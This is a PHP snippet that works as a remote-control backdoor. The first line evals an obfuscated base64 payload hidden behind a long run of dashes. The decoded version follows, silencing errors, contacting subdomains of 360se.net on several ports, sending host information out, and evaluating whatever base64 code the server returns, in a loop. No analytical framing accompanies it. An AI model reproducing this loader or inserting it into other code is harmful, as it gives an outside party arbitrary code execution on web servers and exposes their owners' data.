$i='info^_^'.base64_encode($V.'<|>'.$M.'<|>').'==END==';$zzz='-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------';@eval(base64_decode('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpOwplcnJvcl9yZXBvcnRpbmcoMCk7CmZ1bmN0aW9uIHRjcEdldCgkc2VuZE1zZyA9ICcnLCAkaXAgPSAnMzYwc2UubmV0JywgJHBvcnQgPSAnMjAxMjMnKXsKCSRyZXN1bHQgPSAiIjsKICAkaGFuZGxlID0gc3RyZWFtX3NvY2tldF9jbGllbnQoInRjcDovL3skaXB9OnskcG9ydH0iLCAkZXJybm8sICRlcnJzdHIsMTApOyAKICBpZiggISRoYW5kbGUgKXsKICAgICRoYW5kbGUgPSBmc29ja29wZW4oJGlwLCBpbnR2YWwoJHBvcnQpLCAkZXJybm8sICRlcnJzdHIsIDUpOwoJaWYoICEkaGFuZGxlICl7CgkJcmV0dXJuICJlcnIiOwoJfQogIH0KICBmd3JpdGUoJGhhbmRsZSwgJHNlbmRNc2cuIlxuIik7Cgl3aGlsZSghZmVvZigkaGFuZGxlKSl7CgkJc3RyZWFtX3NldF90aW1lb3V0KCRoYW5kbGUsIDIpOwoJCSRyZXN1bHQgLj0gZnJlYWQoJGhhbmRsZSwgMTAyNCk7CgkJJGluZm8gPSBzdHJlYW1fZ2V0X21ldGFfZGF0YSgkaGFuZGxlKTsKCQlpZiAoJGluZm9bJ3RpbWVkX291dCddKSB7CgkJICBicmVhazsKCQl9CgkgfQogIGZjbG9zZSgkaGFuZGxlKTsgCiAgcmV0dXJuICRyZXN1bHQ7IAp9CgokZHMgPSBhcnJheSgid3d3IiwiYmJzIiwiY21zIiwiZG93biIsInVwIiwiZmlsZSIsImZ0cCIpOwokcHMgPSBhcnJheSgiMjAxMjMiLCI0MDEyNSIsIjgwODAiLCI4MCIsIjUzIik7CiRuID0gZmFsc2U7CmRvIHsKCSRuID0gZmFsc2U7Cglmb3JlYWNoICgkZHMgYXMgJGQpewoJCSRiID0gZmFsc2U7CgkJZm9yZWFjaCAoJHBzIGFzICRwKXsKCQkJJHJlc3VsdCA9IHRjcEdldCgkaSwkZC4iLjM2MHNlLm5ldCIsJHApOyAKCQkJaWYgKCRyZXN1bHQgIT0gImVyciIpewoJCQkJJGIgPXRydWU7CgkJCQlicmVhazsKCQkJfQoJCX0KCQlpZiAoJGIpYnJlYWs7Cgl9CgkkaW5mbyA9IGV4cGxvZGUoIjxePiIsJHJlc3VsdCk7CglpZiAoY291bnQoJGluZm8pPT00KXsKCQlpZiAoc3RycG9zKCRpbmZvWzNdLCIvKk9uZW1vcmUqLyIpICE9PSBmYWxzZSl7CgkJCSRpbmZvWzNdID0gc3RyX3JlcGxhY2UoIi8qT25lbW9yZSovIiwiIiwkaW5mb1szXSk7CgkJCSRuPXRydWU7CgkJfQoJCUBldmFsKGJhc2U2NF9kZWNvZGUoJGluZm9bM10pKTsKCX0KfXdoaWxlKCRuKTs='));




@ini_set("display_errors","0");
error_reporting(0);
function tcpGet($sendMsg = '', $ip = '360se.net', $port = '20123'){
        $result = "";
  $handle = stream_socket_client("tcp://{$ip}:{$port}", $errno, $errstr,10);
  if( !$handle ){
    $handle = fsockopen($ip, intval($port), $errno, $errstr, 5);
        if( !$handle ){
                return "err";
        }
  }
  fwrite($handle, $sendMsg."\n");
        while(!feof($handle)){
                stream_set_timeout($handle, 2);
                $result .= fread($handle, 1024);
                $info = stream_get_meta_data($handle);
                if ($info['timed_out']) {
                  break;
                }
         }
  fclose($handle);
  return $result;
}

$ds = array("www","bbs","cms","down","up","file","ftp");
$ps = array("20123","40125","8080","80","53");
$n = false;
do {
        $n = false;
        foreach ($ds as $d){
                $b = false;
                foreach ($ps as $p){
                        $result = tcpGet($i,$d.".360se.net",$p);
                        if ($result != "err"){
                                $b =true;
                                break;
                        }
                }
                if ($b)break;
        }
        $info = explode("<^>",$result);
        if (count($info)==4){
                if (strpos($info[3],"/*Onemore*/") !== false){
                        $info[3] = str_replace("/*Onemore*/","",$info[3]);
                        $n=true;
                }
                @eval(base64_decode($info[3]));
        }
}while($n);